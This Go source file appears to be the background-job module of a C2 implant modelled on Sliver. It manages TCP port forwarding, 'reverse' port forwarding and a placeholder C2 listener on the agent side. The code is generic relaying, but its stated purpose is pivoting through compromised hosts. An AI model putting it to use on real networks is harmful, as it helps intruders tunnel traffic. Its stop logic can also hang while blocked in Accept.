// Package job provides background task management for the agent.
// 借鉴 Sliver 的 job 系统：后台任务在 goroutine 中运行，
// 支持 port forward、rport forward、HTTP listener 等持久任务。
package job

import (
	"fmt"
	"net"
	"sync"

	"github.com/aegis-c2/aegis/shared"
)

// DefaultManager 是全局任务管理器。
var DefaultManager = NewManager()

// Job 表示一个后台任务。
type Job struct {
	ID     string
	Type   string
	Status string // running/stopped/killed
	cancel func()
	done   chan struct{}
	once   sync.Once
	mu     sync.RWMutex
}

// Manager 管理所有后台任务。
type Manager struct {
	jobs map[string]*Job
	mu   sync.RWMutex
}

// NewManager 创建任务管理器。
func NewManager() *Manager {
	return &Manager{
		jobs: make(map[string]*Job),
	}
}

// Start 启动一个后台任务。
func (m *Manager) Start(jobType string, args map[string]string) (string, error) {
	jobID := shared.GenID("jb")

	switch jobType {
	case "port_forward":
		return m.startPortForward(jobID, args)
	case "rport_forward":
		return m.startRPortForward(jobID, args)
	case "listener":
		return m.startListener(jobID, args)
	default:
		return "", fmt.Errorf("unknown job type: %s", jobType)
	}
}

func (m *Manager) startPortForward(jobID string, args map[string]string) (string, error) {
	bindAddr := args["bind"]
	target := args["target"]
	if bindAddr == "" || target == "" {
		return "", fmt.Errorf("port_forward requires 'bind' and 'target' args")
	}
	return m.startForwardingJob(jobID, "port_forward", bindAddr, target)
}

func (m *Manager) startRPortForward(jobID string, args map[string]string) (string, error) {
	bindPort := args["bind_port"]
	target := args["target"]
	if bindPort == "" || target == "" {
		return "", fmt.Errorf("rport_forward requires 'bind_port' and 'target' args")
	}
	return m.startForwardingJob(jobID, "rport_forward", "0.0.0.0:"+bindPort, target)
}

func (m *Manager) startForwardingJob(jobID, jobType, bindAddr, target string) (string, error) {
	ln, err := net.Listen("tcp", bindAddr)
	if err != nil {
		return "", fmt.Errorf("listen %s: %v", bindAddr, err)
	}

	ctx, cancel := newJobContext()
	job := &Job{ID: jobID, Type: jobType, Status: "running", cancel: cancel, done: make(chan struct{})}
	m.mu.Lock()
	m.jobs[jobID] = job
	m.mu.Unlock()

	go func() {
		defer func() {
			ln.Close()
			job.once.Do(func() { close(job.done) })
		}()

		for {
			select {
			case <-ctx.Done():
				return
			default:
			}

			conn, err := ln.Accept()
			if err != nil {
				return
			}

			go func(c net.Conn) {
				defer c.Close()
				tgtConn, err := net.Dial("tcp", target)
				if err != nil {
					return
				}
				defer tgtConn.Close()

				var wg sync.WaitGroup
				wg.Add(2)
				go func() { defer wg.Done(); relay(c, tgtConn) }()
				go func() { defer wg.Done(); relay(tgtConn, c) }()
				wg.Wait()
			}(conn)
		}
	}()

	return jobID, nil
}

func (m *Manager) startListener(jobID string, args map[string]string) (string, error) {
	bindAddr := args["bind"]
	if bindAddr == "" {
		return "", fmt.Errorf("listener requires 'bind' arg")
	}

	ln, err := net.Listen("tcp", bindAddr)
	if err != nil {
		return "", fmt.Errorf("listen %s: %v", bindAddr, err)
	}

	ctx, cancel := newJobContext()
	job := &Job{ID: jobID, Type: "listener", Status: "running", cancel: cancel, done: make(chan struct{})}
	m.mu.Lock()
	m.jobs[jobID] = job
	m.mu.Unlock()

	go func() {
		defer func() {
			ln.Close()
			job.once.Do(func() { close(job.done) })
		}()

		for {
			select {
			case <-ctx.Done():
				return
			default:
			}

			conn, err := ln.Accept()
			if err != nil {
				return
			}
			// 连接后关闭（占位：未来可接入 HTTP C2 listener）
			conn.Close()
		}
	}()

	return jobID, nil
}

// Stop 优雅停止任务。
func (m *Manager) Stop(jobID string) error {
	m.mu.RLock()
	job, ok := m.jobs[jobID]
	m.mu.RUnlock()
	if !ok {
		return fmt.Errorf("job not found: %s", jobID)
	}

	job.cancel()
	<-job.done
	job.mu.Lock()
	job.Status = "stopped"
	job.mu.Unlock()

	m.mu.Lock()
	delete(m.jobs, jobID)
	m.mu.Unlock()

	return nil
}

// Kill 强制终止任务。
func (m *Manager) Kill(jobID string) error {
	m.mu.RLock()
	job, ok := m.jobs[jobID]
	m.mu.RUnlock()
	if !ok {
		return fmt.Errorf("job not found: %s", jobID)
	}

	job.cancel()
	<-job.done
	job.mu.Lock()
	job.Status = "killed"
	job.mu.Unlock()

	m.mu.Lock()
	delete(m.jobs, jobID)
	m.mu.Unlock()

	return nil
}

// List 返回所有活跃任务。
func (m *Manager) List() []*JobInfo {
	m.mu.RLock()
	defer m.mu.RUnlock()

	result := make([]*JobInfo, 0, len(m.jobs))
	for _, job := range m.jobs {
		job.mu.RLock()
		status := job.Status
		job.mu.RUnlock()
		result = append(result, &JobInfo{
			ID:     job.ID,
			Type:   job.Type,
			Status: status,
		})
	}
	return result
}

// JobInfo 是任务的简单信息。
type JobInfo struct {
	ID     string
	Type   string
	Status string
}

func relay(src, dst net.Conn) {
	defer dst.Close()
	buf := make([]byte, 32*1024)
	for {
		n, err := src.Read(buf)
		if err != nil {
			return
		}
		if _, werr := dst.Write(buf[:n]); werr != nil {
			return
		}
	}
}

// jobContext 封装可取消的上下文。
type jobContext struct {
	done chan struct{}
}

func newJobContext() (*jobContext, func()) {
	done := make(chan struct{})
	cancel := func() { close(done) }
	return &jobContext{done: done}, cancel
}

func (c *jobContext) Done() <-chan struct{} { return c.done }
